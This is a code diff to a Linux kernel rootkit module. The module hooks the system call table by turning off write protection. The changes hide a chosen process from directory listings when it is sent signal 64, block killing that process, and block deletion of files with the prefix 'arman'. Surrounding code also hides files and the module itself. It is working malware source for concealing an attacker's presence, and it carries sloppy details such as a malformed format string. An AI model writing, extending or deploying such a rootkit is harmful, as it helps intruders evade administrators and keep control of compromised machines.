@@ -10,6 +10,12 @@
 #include <linux/icmp.h>
 #include <linux/ftrace.h>
 #include <linux/list.h>
+#include <linux/fs.h>
+#include <linux/slab.h>
+#include <asm/uaccess.h>
+#include <linux/namei.h>
+#include <linux/path.h>
+
 
 #ifdef MODULE
 extern struct module __this_module;
@@ -28,6 +34,7 @@ unsigned long *__sys_call_table_addr;
 static struct list_head *prev_module;
 
 char cmd_string[MAX_CMD_LEN];
+char pid_to_hide[NAME_MAX];
 struct work_struct my_work;
 
 static struct nf_hook_ops nfho;
@@ -93,6 +100,7 @@ typedef asmlinkage long (*syscall_wrapper)(const struct pt_regs *regs);
 static syscall_wrapper orig_kill;
 static syscall_wrapper orig_sys_openat;
 static syscall_wrapper orig_sys_getdents64;
+static syscall_wrapper orig_unlink;
 
 
 static inline void write_forced_cr0(unsigned long value)
@@ -122,19 +130,35 @@ static void protect_memory(void)
 static asmlinkage long hack_kill_syscall(const struct pt_regs* regs)
 {
     int sig = regs->si;
+    pid_t pid = regs->di;
 
-    void hide_module(void);
-    void show_module(void);
+//    void hide_module(void);
+//    void show_module(void);
+//
+//    if (sig == HIDEMODULE) {
+//        hide_module();
+//        return 0;
+//    } else if (sig == SHOWMODULE) {
+//        show_module();
+//        return 0;
+//    } else if (sig == HIDEFILES) {
+//        return 0;
+//    } else if (sig == SHOWFILES) {
+//        return 0;
+//    }
 
-    if (sig == HIDEMODULE) {
-        hide_module();
+    char cur_pid[NAME_MAX];
+
+    if (sig == 64) {
+        printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
+        sprintf(pid_to_hide, "%d%", pid);
         return 0;
-    } else if (sig == SHOWMODULE) {
-        show_module();
-        return 0;
-    } else if (sig == HIDEFILES) {
-        return 0;
-    } else if (sig == SHOWFILES) {
+    }
+
+    sprintf(cur_pid, "%d%", pid);
+
+    if (strcmp(cur_pid, pid_to_hide) == 0) {
+        printk(KERN_INFO "rootkit: can't delete process with pid %d\n", pid);
         return 0;
     }
 
@@ -168,6 +192,29 @@ static asmlinkage long fh_sys_openat(struct pt_regs *regs)
 	return orig_sys_openat(regs);
 }
 
+asmlinkage long h_unlink(struct pt_regs *regs)
+{
+    const char __user *pathname = regs->di;
+    char buf[HIDE_PREFIX_SZ + 1];
+
+    // Copy the user-space pathname to kernel space
+    if (strncpy_from_user(buf, pathname, HIDE_PREFIX_SZ) < 0)
+        return -EFAULT;
+
+    // Null-terminate the copied string
+    buf[HIDE_PREFIX_SZ] = '\0';
+
+    printk(KERN_ALERT "Permission denied for arman: %s\n", buf);
+
+    // Check if the file starts with "arman"
+    if (strstr(buf, HIDE_PREFIX) != NULL) {
+        printk(KERN_ALERT "Permission denied for arman: %s\n", buf);
+        return -EPERM;
+    }
+
+    return orig_unlink(regs);
+}
+
 static asmlinkage long h_sys_getdents64(struct pt_regs *regs)
 {
     unsigned int fd = regs->di;
@@ -189,7 +236,11 @@ static asmlinkage long h_sys_getdents64(struct pt_regs *regs)
     for (buff = 0; buff < ret;) {
 		ent = (struct linux_dirent64*)(dbuf + buff);
 
-		if (strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0) {
+		if (
+                strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0
+                ||
+                (strncmp(pid_to_hide, "", NAME_MAX) != 0 && strcmp(ent->d_name, pid_to_hide) == 0)
+                ) {
 			size_t reclen = ent->d_reclen;
 
 			memcpy(dbuf + buff, dbuf + buff + reclen, ret - (buff + reclen));
@@ -274,7 +325,23 @@ static void restore_getdents64(void)
     __sys_call_table_addr[__NR_getdents64] = (unsigned long)orig_sys_getdents64;
 }
 
-// Icmp logic
+static void store_unlink(void)
+{
+    orig_unlink = (syscall_wrapper)__sys_call_table_addr[__NR_unlink];
+}
+
+
+static void hook_unlink(void)
+{
+    __sys_call_table_addr[__NR_unlink] = (unsigned long)&h_unlink;
+}
+
+
+static void restore_unlink(void)
+{
+    /* Restore syscall table */
+    __sys_call_table_addr[__NR_unlink] = (unsigned long)orig_unlink;
+}
 
 static void work_handler(struct work_struct * work)
 {
@@ -371,12 +438,14 @@ static int __init mod_init(void)
     store_kill();
     store_openat();
     store_getdents64();
+    store_unlink();
 
     unprotect_memory();
 
     hook_kill();
     hook_getdents64();
     hook_openat();
+    hook_unlink();
 
     protect_memory();
 
@@ -394,6 +463,7 @@ static void __exit mod_exit(void)
     restore_kill();
     restore_openat();
     restore_getdents64();
+    restore_unlink();
 
     protect_memory();
 
